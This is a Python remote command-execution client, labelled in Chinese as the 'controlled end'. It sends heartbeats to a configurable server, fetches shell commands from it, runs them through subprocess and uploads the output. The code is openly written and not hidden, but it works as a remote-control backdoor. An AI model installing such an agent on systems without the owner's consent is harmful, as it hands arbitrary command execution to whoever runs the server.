import requests
import uuid
import subprocess
import time
import platform
from datetime import datetime

# API服务器地址（需修改为实际服务器IP）
API_SERVER = "http://127.0.0.1:5000"
# 设备唯一ID（首次运行自动生成，持久化存储）
DEVICE_ID_FILE = ".device_id"

def get_device_id():
    """获取设备唯一ID（持久化存储）"""
    if os.path.exists(DEVICE_ID_FILE):
        with open(DEVICE_ID_FILE, 'r', encoding='utf-8') as f:
            return f.read().strip()
    else:
        # 生成UUID作为设备唯一标识
        device_id = str(uuid.uuid4())
        with open(DEVICE_ID_FILE, 'w', encoding='utf-8') as f:
            f.write(device_id)
        return device_id

def send_heartbeat(device_id):
    """发送心跳包，维持在线状态"""
    try:
        response = requests.post(
            f"{API_SERVER}/device/heartbeat",
            json={"device_id": device_id},
            timeout=10
        )
        if response.status_code == 200:
            alias = response.json().get("alias")
            print(f"[{datetime.now()}] 心跳成功 - 设备别名: {alias}")
        else:
            print(f"[{datetime.now()}] 心跳失败: {response.json().get('msg')}")
    except Exception as e:
        print(f"[{datetime.now()}] 心跳异常: {str(e)}")

def get_command(device_id):
    """从API服务器获取指令"""
    try:
        response = requests.post(
            f"{API_SERVER}/device/get_command",
            json={"device_id": device_id},
            timeout=10
        )
        if response.status_code == 200:
            return response.json()
        elif response.status_code == 204:
            # 无指令
            return None
        else:
            print(f"[{datetime.now()}] 获取指令失败: {response.json().get('msg')}")
            return None
    except Exception as e:
        print(f"[{datetime.now()}] 获取指令异常: {str(e)}")
        return None

def execute_command(command):
    """执行系统命令，返回输出和错误信息"""
    try:
        # 根据系统选择shell
        shell = True if platform.system() == "Windows" else False
        result = subprocess.run(
            command,
            shell=shell,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            encoding="utf-8",
            timeout=30  # 命令超时时间（防止阻塞）
        )
        return result.stdout, result.stderr
    except subprocess.TimeoutExpired:
        return "", "命令执行超时（30秒）"
    except Exception as e:
        return "", f"命令执行异常: {str(e)}"

def upload_echo(device_id, output, error):
    """上传命令执行回显到API服务器"""
    try:
        response = requests.post(
            f"{API_SERVER}/device/upload_echo",
            json={
                "device_id": device_id,
                "output": output,
                "error": error
            },
            timeout=10
        )
        if response.status_code == 200:
            print(f"[{datetime.now()}] 回显上传成功")
        else:
            print(f"[{datetime.now()}] 回显上传失败: {response.json().get('msg')}")
    except Exception as e:
        print(f"[{datetime.now()}] 回显上传异常: {str(e)}")

def main():
    print("=== 被控端启动 ===")
    device_id = get_device_id()
    print(f"设备唯一ID: {device_id}")
    print(f"连接API服务器: {API_SERVER}")
    print("==================\n")
    
    # 循环执行：心跳 -> 获取指令 -> 执行指令 -> 上传回显
    while True:
        # 1. 发送心跳
        send_heartbeat(device_id)
        
        # 2. 获取指令
        cmd_data = get_command(device_id)
        if cmd_data:
            command = cmd_data["command"]
            timestamp = cmd_data["timestamp"]
            print(f"\n[{timestamp}] 收到指令: {command}")
            
            # 3. 执行指令
            output, error = execute_command(command)
            print(f"执行结果:")
            print(f"输出: {output or '无'}")
            print(f"错误: {error or '无'}")
            
            # 4. 上传回显
            upload_echo(device_id, output, error)
        
        # 休眠5秒（可调整通信频率）
        time.sleep(5)

if __name__ == "__main__":
    import os
    try:
        main()
    except KeyboardInterrupt:
        print("\n被控端退出")
    except Exception as e:
        print(f"被控端异常退出: {str(e)}")
